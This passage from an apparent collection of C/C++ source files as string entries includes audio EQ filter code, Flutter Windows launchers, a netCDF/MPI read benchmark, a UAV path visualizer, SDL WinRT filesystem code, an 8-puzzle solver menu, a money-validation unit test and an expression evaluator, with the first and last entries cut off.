0x00, 0x60, 0x30, 0x18, 0x0C, 0x06, 0x00, \n0x00, 0x78, 0x18, 0x18, 0x18, 0x18, 0x18, 0x78, \n0x00, 0x08, 0x14, 0x22, 0x41, 0x00, 0x00, 0x00, \n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7F, \n0x00, 0x0C, 0x0C, 0x06, 0x00, 0x00, 0x00, 0x00, \n0x00, 0x00, 0x00, 0x3C, 0x06, 0x3E, 0x66, 0x3E, \n0x00, 0x60, 0x60, 0x60, 0x7C, 0x66, 0x66, 0x7C, \n0x00, 0x00, 0x00, 0x3C, 0x66, 0x60, 0x66, 0x3C, \n0x00, 0x06, 0x06, 0x06, 0x3E,",
    "/*\nSoLoud audio engine\nCopyright (c) 2013-2020 Jari Komppa\n\nThis software is provided 'as-is', without any express or implied\nwarranty. In no event will the authors be held liable for any damages\narising from the use of this software.\n\nPermission is granted to anyone to use this software for any purpose,\nincluding commercial applications, and to alter it and redistribute it\nfreely, subject to the following restrictions:\n\n   1. The origin of this software must not be misrepresented; you must not\n   claim that you wrote the original software. If you use this software\n   in a product, an acknowledgment in the product documentation would be\n   appreciated but is not required.\n\n   2. Altered source versions must be plainly marked as such, and must not be\n   misrepresented as being the original software.\n\n   3. This notice may not be removed or altered from any source\n   distribution.\n*/\n\n#include <string.h>\n#include \"soloud.h\"\n#include \"soloud_eqfilter.h\"\n\n\nnamespace SoLoud\n{\n\tEqFilterInstance::EqFilterInstance(EqFilter *aParent)\n\t{\n\t\tmParent = aParent;\n\t\tinitParams(9);\n\t\tmParam[BAND1] = aParent->mVolume[BAND1 - BAND1];\n\t\tmParam[BAND2] = aParent->mVolume[BAND2 - BAND1];\n\t\tmParam[BAND3] = aParent->mVolume[BAND3 - BAND1];\n\t\tmParam[BAND4] = aParent->mVolume[BAND4 - BAND1];\n\t\tmParam[BAND5] = aParent->mVolume[BAND5 - BAND1];\n\t\tmParam[BAND6] = aParent->mVolume[BAND6 - BAND1];\n\t\tmParam[BAND7] = aParent->mVolume[BAND7 - BAND1];\n\t\tmParam[BAND8] = aParent->mVolume[BAND8 - BAND1];\n\t}\n\n\tstatic float catmullrom(float t, float p0, float p1, float p2, float p3)\n\t{\n\t\treturn 0.5f * (\n\t\t\t(2 * p1) +\n\t\t\t(-p0 + p2) * t +\n\t\t\t(2 * p0 - 5 * p1 + 4 * p2 - p3) * t * t +\n\t\t\t(-p0 + 3 * p1 - 3 * p2 + p3) * t * t * t\n\t\t\t);\n\t}\n\n\n\tvoid EqFilterInstance::fftFilterChannel(float *aFFTBuffer, unsigned int aSamples, float /*aSamplerate*/, time /*aTime*/, unsigned int /*aChannel*/, unsigned int /*aChannels*/)\n\t{\n\t\tcomp2MagPhase(aFFTBuffer, aSamples / 2);\n\t\tunsigned int p;\t\t\n\t\tfor (p = 0; p < aSamples / 2; p++)\n\t\t{\n\t\t\tint i = (int)floor(sqrt(p / (float)(aSamples / 2)) * (aSamples / 2));\n\t\t\tint p2 = (i / (aSamples / 16));\n\t\t\tint p1 = p2 - 1;\n\t\t\tint p0 = p1 - 1;\n\t\t\tint p3 = p2 + 1;\n\t\t\tif (p1 < 0) p1 = 0;\n\t\t\tif (p0 < 0) p0 = 0;\n\t\t\tif (p3 > 7) p3 = 7;\n\t\t\tfloat v = (float)(i % (aSamples / 16)) / (float)(aSamples / 16);\n\t\t\taFFTBuffer[p * 2] *= catmullrom(v, mParam[p0 + 1], mParam[p1 + 1], mParam[p2 + 1], mParam[p3 + 1]);\n\t\t}\n\t\tmemset(aFFTBuffer + aSamples, 0, sizeof(float) * aSamples);\n\t\tmagPhase2Comp(aFFTBuffer, aSamples / 2);\n\t}\n\n\tresult EqFilter::setParam(unsigned int aBand, float aVolume)\n\t{\n\t\tif (aBand < BAND1 || aBand > BAND8) return INVALID_PARAMETER;\n\t\tif (aVolume < getParamMin(BAND1) || aVolume > getParamMax(BAND1))\n\t\t\treturn INVALID_PARAMETER;\n\n\t\tmVolume[aBand - BAND1] = aVolume;\n\t\treturn SO_NO_ERROR;\n\t}\n\n\tint EqFilter::getParamCount()\n\t{\n\t\treturn 9;\n\t}\n\n\tconst char* EqFilter::getParamName(unsigned int aParamIndex)\n\t{\n\t\tswitch (aParamIndex)\n\t\t{\n\t\tcase BAND1: return \"Band 1\";\n\t\tcase BAND2: return \"Band 2\";\n\t\tcase BAND3: return \"Band 3\";\n\t\tcase BAND4: return \"Band 4\";\n\t\tcase BAND5: return \"Band 5\";\n\t\tcase BAND6: return \"Band 6\";\n\t\tcase BAND7: return \"Band 7\";\n\t\tcase BAND8: return \"Band 8\";\n\t\t}\n\t\treturn \"Wet\";\n\t}\n\n\tunsigned int EqFilter::getParamType(unsigned int aParamIndex)\n\t{\n\t\treturn FLOAT_PARAM;\n\t}\n\n\tfloat EqFilter::getParamMax(unsigned int aParamIndex)\n\t{\n\t\tif (aParamIndex == 0)\n\t\t\treturn 1;\n\t\treturn 4;\n\t}\n\n\tfloat EqFilter::getParamMin(unsigned int aParamIndex)\n\t{\n\t\treturn 0;\n\t}\n\n\tEqFilter::EqFilter()\n\t{\n\t\tfor (int i = 0; i < 8; i++)\n\t\t\tmVolume[i] = 1;\n\t}\n\n\tFilterInstance *EqFilter::createInstance()\n\t{\n\t\treturn new EqFilterInstance(this);\n\t}\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"btc\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"my_first_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <numeric>\n#include <tuple>\n#include <chrono>\n#include <netcdf.h>\n#include <assert.h>\n#include <mpi.h>\n#include <adios2.h>\n#include \"../raster.h\"\n#define ERR do{ if (status != NC_NOERR){ printf(\"Error at line %d: %s\\n\", __LINE__, nc_strerror(status)); exit(status);} } while(0);\nusing namespace std::chrono;\n\nstatic bool verbose = true;\n\n// scan the mask to find the upper-left corber, height and width\nauto get_bounding_box(int* mask, int h, int w, int region_id)\n{\n    int rs = h + 1, cs = w + 1, rt = -1, ct = -1;\n    for (int i = 0; i < h; i++)\n    {\n        for (int j = 0; j < w; j++)\n        {\n            if (mask[i*w + j] == region_id)\n            {\n                if (i < rs) rs = i;\n                if (j < cs) cs = j;\n                if (i > rt) rt = i;\n                if (j > ct) ct = j;\n            }\n        }\n    }\n    return std::make_tuple(rs, cs, rt, ct);\n}\n\nint main(int argc, char **argv)\n{\n    MPI_Init(&argc, &argv);\n    if(argc <= 5)\n    {\n        std::cerr << \"Usage: ./masked_multi_read <INPUT_NETCDF> <INPUT_RASTER> <VARNAME> <MASKNAME> [<REGION_ID>]+\\n\";\n        std::cerr << \" It reads VARNAME in INPUT_FILE and REGION_FILE, compares read peformance of accessing [REGION_ID]\\n\";\n        return 1;\n    };\n    int status, ncid, varid, ndims, vartype, rank, dimids[5], region_id;\n    size_t dimlens[5];\n    float* buffer;\n    std::string infile = argv[1], regionfile = argv[2], var = argv[3], mask = argv[4];\n    MPI_Comm_rank(MPI_COMM_WORLD, &rank);\n\n    // get some properties of dataset\n    std::string if1 = infile.substr(0, infile.length() - 3) + \"_\" + std::to_string(rank) + \".nc\";\n    status = nc_open(if1.c_str(), NC_NETCDF4 | NC_NOWRITE, &ncid);\n    status = nc_inq_varid(ncid, mask.c_str(), &varid); ERR;\n    status = nc_inq_varndims(ncid, varid, &ndims); ERR;\n    status = nc_inq_vardimid(ncid, varid, dimids); ERR;\n    status = nc_inq_vartype(ncid, varid, &vartype); ERR;\n    for (int i = 0; i < ndims; i++)\n        status = nc_inq_dimlen(ncid, dimids[i], &dimlens[i]);\n    size_t masksize = std::accumulate(&dimlens[0], &dimlens[ndims], 1, [](size_t a, size_t b){ return a * b; });\n    int* maskbuffer = new int[masksize];\n    status = nc_get_var(ncid, varid, maskbuffer); ERR;\n    if (vartype == NC_FLOAT)\n    {\n        for (int i = 0; i < masksize; i++)\n            maskbuffer[i] = int(*((float*)(maskbuffer + i)));\n    }\n    if (rank == 0 && verbose)\n        printf(\"Mask dim: %d, mask shape = (%ld %ld), total = %ld\\n\", ndims, dimlens[ndims-2], dimlens[ndims-1], masksize);\n\n    status = nc_inq_varid(ncid, var.c_str(), &varid); ERR;\n    status = nc_inq_varndims(ncid, varid, &ndims); ERR;\n    status = nc_inq_vardimid(ncid, varid, dimids); ERR;\n    for (int i = 0; i < ndims; i++)\n        status = nc_inq_dimlen(ncid, dimids[i], &dimlens[i]);\n    size_t bufsize = std::accumulate(&dimlens[0], &dimlens[ndims], 1, [](size_t a, size_t b){ return a * b; });\n    buffer = new float[bufsize];\n    std::fill(&buffer[0], &buffer[bufsize], 0.0);\n    if (rank == 0 && verbose)\n    {\n        printf(\"Data dim: %d, data shape = ( \", ndims);\n        for (int i = 0; i < ndims; i++) printf(\"%d \", dimlens[i]);\n            printf(\"), total = %ld\\n\", bufsize);        \n    }\n\n    // original process: (1) open; (2) read mask; (3) get BB; (4) read data using hyperslab reading\n    // final bounding box\n    int rf = 10000, cf = 10000, rtf = -1, ctf = -1;\n    // merge read requests, find the largest common bounding box\n    for (int i = 5; i < argc; i++)\n    {\n        region_id = std::atoi(argv[i]);\n        auto [r, c, rt, ct] = get_bounding_box(maskbuffer, dimlens[ndims-2], dimlens[ndims-1], region_id);\n        if (verbose && rank == 0)\n            printf(\" box starts at: (%d %d %d %d)\\n\", r,c,rt,ct);\n        if (r < rf) rf = r;\n        if (c < cf) cf = c;\n        if (rt > rtf) rtf = rt;\n        if (ct > ctf) ctf = ct;\n    }\n    size_t* start = new size_t[ndims], *count = new size_t[ndims];\n    for (int i = 0; i < ndims-2; i++) { start[i] = 0; count[i] = dimlens[i]; }\n    start[ndims - 2] = rf, start[ndims - 1] = cf;\n    count[ndims - 2] = rtf-rf+1, count[ndims - 1] = ctf-cf+1;\n    if (rank == 0 && verbose)\n    {\n        printf(\"bounding box starts at: (%d %d %d %d)\\n\", start[0], start[1], start[2], start[3]);\n        printf(\"bounding box size: (%d %d %d %d)\\n\", count[0], count[1], count[2], count[3]);        \n    }\n    printf(\"%ld\\n\", count[0]*count[1]*count[2]*count[3]);\n    auto t1 = high_resolution_clock::now();\n    status = nc_get_vara_float(ncid, varid, start, count, buffer); ERR;\n    auto t2 = high_resolution_clock::now();\n    status = nc_close(ncid); ERR;\n    printf(\"Time_netCDF_Read=%fs\\n\", duration_cast<microseconds>(t2 - t1).count() / 1000000.0);\n    MPI_Barrier(MPI_COMM_WORLD);\n    // delete[] start; delete[] count;\n\n    // regioned read process\n    std::string if2 = regionfile.substr(0, regionfile.length() - 3) + \"_\" + std::to_string(rank) + \".nc\"; \n    status = nc_open(if2.c_str()",
    "#include \"UAV.h\"\n#include <fstream>\n#include <sstream>\n#include <iomanip>\n#include <iostream>\n\nUAV::UAV(const std::string& window_title) \n    : window(sf::VideoMode(WINDOW_WIDTH, WINDOW_HEIGHT), window_title),\n      isPaused(false),\n      currentPathIndex(0)\n{\n    initializeWindow();\n    initializeText();\n    initializeMarkers();\n}\n\nUAV::~UAV() {\n    window.close();\n}\n\nvoid UAV::initializeWindow() {\n    window.setFramerateLimit(60);\n    mainView = window.getDefaultView();\n    \n    if (!font.loadFromFile(\"arial.ttf\")) {\n        std::cerr << \"Error loading font\" << std::endl;\n    }\n}\n\nvoid UAV::initializeText() {\n    // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0442\u0435\u043a\u0441\u0442\u043e\u0432\u044b\u0445 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432\n    altitudeText.setFont(font);\n    velocityText.setFont(font);\n    statusText.setFont(font);\n\n    altitudeText.setCharacterSize(20);\n    velocityText.setCharacterSize(20);\n    statusText.setCharacterSize(20);\n\n    altitudeText.setPosition(10, 10);\n    velocityText.setPosition(10, 40);\n    statusText.setPosition(10, 70);\n\n    altitudeText.setFillColor(sf::Color::White);\n    velocityText.setFillColor(sf::Color::White);\n    statusText.setFillColor(sf::Color::White);\n}\n\nvoid UAV::initializeMarkers() {\n    // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043c\u0430\u0440\u043a\u0435\u0440\u0430 \u0411\u041f\u041b\u0410\n    uavMarker.setRadius(5.0f);\n    uavMarker.setFillColor(sf::Color::Red);\n    uavMarker.setOrigin(5.0f, 5.0f);\n}\n\nvoid UAV::loadFlightPath(const std::string& filename) {\n    std::ifstream file(filename);\n    std::string line;\n    \n    flightPath.clear();\n    pathPoints.clear();\n    pathLines.clear();\n\n    while (std::getline(file, line)) {\n        std::istringstream iss(line);\n        double x, y, z;\n        if (iss >> x >> y >> z) {\n            flightPath.push_back(Eigen::Vector3d(x, y, z));\n        }\n    }\n\n    createPathVisuals();\n}\n\nvoid UAV::createPathVisuals() {\n    // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0442\u043e\u0447\u0435\u043a \u043c\u0430\u0440\u0448\u0440\u0443\u0442\u0430\n    for (const auto& point : flightPath) {\n        sf::CircleShape pathPoint(3.0f);\n        pathPoint.setFillColor(sf::Color::Yellow);\n        pathPoint.setPosition(worldToScreen(point));\n        pathPoint.setOrigin(3.0f, 3.0f);\n        pathPoints.push_back(pathPoint);\n    }\n\n    // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043b\u0438\u043d\u0438\u0439 \u043c\u0430\u0440\u0448\u0440\u0443\u0442\u0430\n    for (size_t i = 0; i < flightPath.size() - 1; ++i) {\n        sf::Vector2f start = worldToScreen(flightPath[i]);\n        sf::Vector2f end = worldToScreen(flightPath[i + 1]);\n        \n        sf::RectangleShape line;\n        float length = std::sqrt(\n            std::pow(end.x - start.x, 2) + \n            std::pow(end.y - start.y, 2)\n        );\n        float angle = std::atan2(end.y - start.y, end.x - start.x);\n\n        line.setSize(sf::Vector2f(length, 2.0f));\n        line.setPosition(start);\n        line.setRotation(angle * 180 / M_PI);\n        line.setFillColor(sf::Color(255, 255, 0, 128));\n        \n        pathLines.push_back(line);\n    }\n}\n\nvoid UAV::update(const Eigen::Vector3d& position, \n                 const Eigen::Vector3d& velocity,\n                 double altitude) {\n    if (!isPaused) {\n        // \u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u043e\u0437\u0438\u0446\u0438\u0438 \u043c\u0430\u0440\u043a\u0435\u0440\u0430 \u0411\u041f\u041b\u0410\n        sf::Vector2f screenPos = worldToScreen(position);\n        uavMarker.setPosition(screenPos);\n\n        // \u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u0442\u0435\u043a\u0441\u0442\u043e\u0432\u043e\u0439 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438\n        updateTexts(velocity, altitude);\n    }\n}\n\nvoid UAV::updateTexts(const Eigen::Vector3d& velocity, double altitude) {\n    float speed = velocity.norm();\n    \n    std::stringstream alt, vel, status;\n    alt << \"\u0412\u044b\u0441\u043e\u0442\u0430: \" << std::fixed << std::setprecision(1) << altitude << \" \u043c\";\n    vel << \"\u0421\u043a\u043e\u0440\u043e\u0441\u0442\u044c: \" << std::fixed << std::setprecision(1) << speed << \" \u043c/\u0441\";\n    status << \"\u0421\u0442\u0430\u0442\u0443\u0441: \" << (isPaused ? \"\u041f\u0430\u0443\u0437\u0430\" : \"\u041f\u043e\u043b\u0435\u0442\");\n\n    altitudeText.setString(alt.str());\n    velocityText.setString(vel.str());\n    statusText.setString(status.str());\n}\n\nvoid UAV::render() {\n    window.clear(sf::Color(30, 30, 30));\n\n    drawTerrain();\n    drawPath();\n    drawUAV();\n    drawInterface();\n\n    window.display();\n}\n\nvoid UAV::drawTerrain() {\n    // \u041e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u0441\u0435\u0442\u043a\u0438 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\n    for (int i = 0; i < 20; ++i) {\n        sf::RectangleShape horizontalLine(sf::Vector2f(WINDOW_WIDTH, 1.0f));\n        sf::RectangleShape verticalLine(sf::Vector2f(1.0f, WINDOW_HEIGHT));\n        \n        horizontalLine.setPosition(0, i * WINDOW_HEIGHT / 20);\n        verticalLine.setPosition(i * WINDOW_WIDTH / 20, 0);\n        \n        horizontalLine.setFillColor(sf::Color(100, 100, 100));\n        verticalLine.setFillColor(sf::Color(100, 100, 100));\n        \n        window.draw(horizontalLine);\n        window.draw(verticalLine);\n    }\n}\n\nvoid UAV::drawPath() {\n    // \u041e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u043b\u0438\u043d\u0438\u0439 \u043c\u0430\u0440\u0448\u0440\u0443\u0442\u0430\n    for (const auto& line : pathLines) {\n        window.draw(line);\n    }\n    \n    // \u041e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u0442\u043e\u0447\u0435\u043a \u043c\u0430\u0440\u0448\u0440\u0443\u0442\u0430\n    for (const auto& point : pathPoints) {\n        window.draw(point);\n    }\n}\n\nvoid UAV::drawUAV() {\n    window.draw(uavMarker);\n}\n\nvoid UAV::drawInterface() {\n    window.draw(altitudeText);\n    window.draw(velocityText);\n    window.draw(statusText);\n}\n\nvoid UAV::handleEvents() {\n    sf::Event event;\n    while (window.pollEvent(event)) {\n        if (event.type == sf::Event::Closed) {\n            window.cl",
    "/*\n  Simple DirectMedia Layer\n  Copyright (C) 1997-2023 Sam Lantinga <slouken@libsdl.org>\n\n  This software is provided 'as-is', without any express or implied\n  warranty.  In no event will the authors be held liable for any damages\n  arising from the use of this software.\n\n  Permission is granted to anyone to use this software for any purpose,\n  including commercial applications, and to alter it and redistribute it\n  freely, subject to the following restrictions:\n\n  1. The origin of this software must not be misrepresented; you must not\n     claim that you wrote the original software. If you use this software\n     in a product, an acknowledgment in the product documentation would be\n     appreciated but is not required.\n  2. Altered source versions must be plainly marked as such, and must not be\n     misrepresented as being the original software.\n  3. This notice may not be removed or altered from any source distribution.\n*/\n#include \"../../SDL_internal.h\"\n\n/* TODO, WinRT: remove the need to compile this with C++/CX (/ZW) extensions, and if possible, without C++ at all\n */\n\n#ifdef __WINRT__\n\nextern \"C\" {\n#include \"SDL_filesystem.h\"\n#include \"SDL_error.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_system.h\"\n#include \"../../core/windows/SDL_windows.h\"\n}\n\n#include <string>\n#include <unordered_map>\n\nusing namespace std;\nusing namespace Windows::Storage;\n\nextern \"C\" const wchar_t *\nSDL_WinRTGetFSPathUNICODE(SDL_WinRT_Path pathType)\n{\n    switch (pathType) {\n    case SDL_WINRT_PATH_INSTALLED_LOCATION:\n    {\n        static wstring path;\n        if (path.empty()) {\n#if defined(NTDDI_WIN10_19H1) && (NTDDI_VERSION >= NTDDI_WIN10_19H1) && (WINAPI_FAMILY == WINAPI_FAMILY_PC_APP) /* Only PC supports mods */\n            /* Windows 1903 supports mods, via the EffectiveLocation API */\n            if (Windows::Foundation::Metadata::ApiInformation::IsApiContractPresent(\"Windows.Foundation.UniversalApiContract\", 8, 0)) {\n                path = Windows::ApplicationModel::Package::Current->EffectiveLocation->Path->Data();\n            } else {\n                path = Windows::ApplicationModel::Package::Current->InstalledLocation->Path->Data();\n            }\n#else\n            path = Windows::ApplicationModel::Package::Current->InstalledLocation->Path->Data();\n#endif\n        }\n        return path.c_str();\n    }\n\n    case SDL_WINRT_PATH_LOCAL_FOLDER:\n    {\n        static wstring path;\n        if (path.empty()) {\n            path = ApplicationData::Current->LocalFolder->Path->Data();\n        }\n        return path.c_str();\n    }\n\n#if (WINAPI_FAMILY != WINAPI_FAMILY_PHONE_APP) || (NTDDI_VERSION > NTDDI_WIN8)\n    case SDL_WINRT_PATH_ROAMING_FOLDER:\n    {\n        static wstring path;\n        if (path.empty()) {\n            path = ApplicationData::Current->RoamingFolder->Path->Data();\n        }\n        return path.c_str();\n    }\n\n    case SDL_WINRT_PATH_TEMP_FOLDER:\n    {\n        static wstring path;\n        if (path.empty()) {\n            path = ApplicationData::Current->TemporaryFolder->Path->Data();\n        }\n        return path.c_str();\n    }\n#endif\n\n    default:\n        break;\n    }\n\n    SDL_Unsupported();\n    return NULL;\n}\n\nextern \"C\" const char *\nSDL_WinRTGetFSPathUTF8(SDL_WinRT_Path pathType)\n{\n    typedef unordered_map<SDL_WinRT_Path, string> UTF8PathMap;\n    static UTF8PathMap utf8Paths;\n\n    UTF8PathMap::iterator searchResult = utf8Paths.find(pathType);\n    if (searchResult != utf8Paths.end()) {\n        return searchResult->second.c_str();\n    }\n\n    const wchar_t *ucs2Path = SDL_WinRTGetFSPathUNICODE(pathType);\n    if (ucs2Path == NULL) {\n        return NULL;\n    }\n\n    char *utf8Path = WIN_StringToUTF8(ucs2Path);\n    utf8Paths[pathType] = utf8Path;\n    SDL_free(utf8Path);\n    return utf8Paths[pathType].c_str();\n}\n\nextern \"C\" char *\nSDL_GetBasePath(void)\n{\n    const char *srcPath = SDL_WinRTGetFSPathUTF8(SDL_WINRT_PATH_INSTALLED_LOCATION);\n    size_t destPathLen;\n    char *destPath = NULL;\n\n    if (srcPath == NULL) {\n        SDL_SetError(\"Couldn't locate our basepath: %s\", SDL_GetError());\n        return NULL;\n    }\n\n    destPathLen = SDL_strlen(srcPath) + 2;\n    destPath = (char *)SDL_malloc(destPathLen);\n    if (destPath == NULL) {\n        SDL_OutOfMemory();\n        return NULL;\n    }\n\n    SDL_snprintf(destPath, destPathLen, \"%s\\\\\", srcPath);\n    return destPath;\n}\n\nextern \"C\" char *\nSDL_GetPrefPath(const char *org, const char *app)\n{\n    /* WinRT note: The 'SHGetFolderPath' API that is used in Windows 7 and\n     * earlier is not available on WinRT or Windows Phone.  WinRT provides\n     * a similar API, but SHGetFolderPath can't be called, at least not\n     * without violating Microsoft's app-store requirements.\n     */\n\n    const WCHAR *srcPath = NULL;\n    WCHAR path[MAX_PATH];\n    char *retval = NULL;\n    WCHAR *worg = NULL;\n    WCHAR *wapp = NULL;\n    size_t new_wpath_len = 0;\n    BOOL api_result = FALSE;\n\n    if (app == NULL) {\n        SDL_InvalidParamError(\"app\");\n        return NULL;\n    }\n    if (or",
    "//main file\n#include <iostream>\n#include \"search.cpp\"\nusing namespace std;\n\nint main() {\n    //default 8-puzzle positions\n    //ignore this(for testing so far)\n    vector<int> startConfig{1,2,0,4,5,3,7,8,6};\n    vector<int> row1;\n    vector<int> row2;\n    vector<int> row3;\n    Problem p;\n    int var;\n    int integer;\n    searchQ searchnode;\n    p = Problem(startConfig);\n\n    cout << endl <<\"Welcome to the 8 puzzle solver.\" << endl\n    << \"Type \\\"1\\\" to use a default puzzle, or \\\"2\\\" to enter your own puzzle.\" << endl;\n\n    cin >> var;\n    if (var == 2) {\n\n        cout << \"Enter your puzzle, use a zero to represent the blank\" << endl\n        << \"Enter the first row, use space or tabs between numbers  \\t\";\n        for(int i = 0; i < 3; i++) {\n            cin >> var;\n            row1.push_back(var);\n            startConfig.at(i) = var;\n        }\n        cout << endl << \"Enter the second row, use space or tabs between numbers  \\t\";\n        for(int i = 0; i < 3; i++) {\n            cin >> var;\n            row2.push_back(var);\n            startConfig.at(i+3) = var;\n        }\n        cout << endl << \"Enter the third row, use space or tabs between numbers  \\t\";\n        for(int i = 0; i < 3; i++) {\n            cin >> var;\n            row3.push_back(var);\n            startConfig.at(i+6) = var;\n        }\n        cout << endl;\n        p = Problem(startConfig);\n    }\n    else {\n        p = Problem();\n    }\n    \n    searchQ search;\n\n    while(true) {\n        cout << endl << \"Enter your choice of algorithm (Please type the number of your choice)\" << endl\n        << \"1. Uniform Cost Search\" << endl\n        << \"2. A* with the Misplaced Tile heuristic.\" << endl\n        << \"3. A* with the Euclidean distance heuristic\" << endl;\n        cin >> var;\n\n        if(var == 1) {\n            search.QTraverse(p, 1);\n            break;\n        }\n\n        else if(var == 2) {\n            search.QTraverse(p, 2);\n            break;\n        }\n\n        else if(var == 3) {\n            search.QTraverse(p, 3);\n            break;\n        }\n        else {\n            cout << \"Choice is invalid, please input one of the choices below\" << endl;\n        }\n    }\n    return 0;\n}\n",
    "#include <iostream>\n#include <sstream>\n#include \"dinheiro.h\"\n\n// Declara\u00e7\u00f5es dos m\u00e9todos da casse Dinheiro\n\nvoid Dinheiro::validar(double val)\n{\n    if (val < MINIMO || val > MAXIMO)\n        throw invalid_argument(\"O valor do dinheiro deve ser de 0,00 e 200.000,00.\");\n}\n\nvoid Dinheiro::setValor(double val)\n{\n    validar(val);\n    this->valor = val;\n}\n\n// Declara\u00e7\u00f5es dos m\u00e9todos do Teste Unit\u00e1rio TUDinheiro\n\nvoid TUDinheiro::setUp()\n{\n    dinheiro = new Dinheiro();\n    estado = sucesso;\n}\n\nvoid TUDinheiro::tearDown()\n{\n    delete dinheiro;\n}\n\nvoid TUDinheiro::testarCenariosSucesso()\n{\n    try\n    {\n        for (size_t i = 0; i < (sizeof(VALORES_VALIDOS) / sizeof(VALORES_VALIDOS[0])); i++)\n        {\n            double valorValido = VALORES_VALIDOS[i];\n            dinheiro->setValor(valorValido);\n            if (dinheiro->getValor() != valorValido)\n                estado = falha;\n        }\n    }\n    catch (...)\n    {\n        estado = falha;\n    }\n}\n\nvoid TUDinheiro::testarCenariosFalha()\n{\n    for (size_t i = 0; i < (sizeof(VALORES_INVALIDOS) / sizeof(VALORES_INVALIDOS[0])); i++)\n    {\n        double valorInvalido = VALORES_INVALIDOS[i];\n\n        try\n        {\n            estado = falha;\n            dinheiro->setValor(valorInvalido);\n        }\n        catch (...)\n        {\n            if (dinheiro->getValor() != valorInvalido)\n                estado = sucesso;\n        }\n    }\n}\n\nEstadoTeste TUDinheiro::run()\n{\n    setUp();\n    testarCenariosSucesso();\n    testarCenariosFalha();\n    tearDown();\n    return estado;\n}\n\nint main()\n{\n    TUDinheiro testeDinheiro;\n\n    switch (testeDinheiro.run())\n    {\n    case sucesso:\n        cout << \"\\nSUCESSO - Dinheiro\";\n        break;\n    case falha:\n        cout << \"\\nFALHA   - Dinheiro\";\n        break;\n    }\n}\n",
    "#include <iostream>\n#include <algorithm>\n#include <unordered_map>\n#include <string>\n#include <stack>\n\nusing namespace std;\n\nstack<int>num;//\u5b58\u50a8\u6570\u5b57\nstack<char>op;//\u5b58\u50a8\u64cd\u4f5c\u7b26\nunordered_map<char,int> cmp{{'+',1},{'-',1},{'*',2},{'/',2}};//\u4f18\u5148\u7ea7\u8bbe\u7f6e\n\nvoid res()//\u8ba1\u7b97\u4e00\u4e2a\u5b50\u6811\u7684\u503c\n{\n    auto b = num.top();\n    num.pop();\n    auto a = num.top();\n    num.pop();\n    auto p = op.top();\n    op.pop();\n    int t;    \n    if(p == '+') t = a + b;\n    else if (p == '-') t = a - b;\n    else if (p == '*') t = a * b;\n    else t = a / b;\n    num.push(t);\n}\n\n\nint main()\n{\n    string a;cin>>a;//\u8bfb\u5165\u8868\u8fbe\u5f0f\n    for(int i = 0; i < a.length(); i ++ )//\u904d\u5386\u5b58\u5165\uff08\u5e76\u8ba1\u7b97\uff09\n    {\n        auto x = a[i];\n        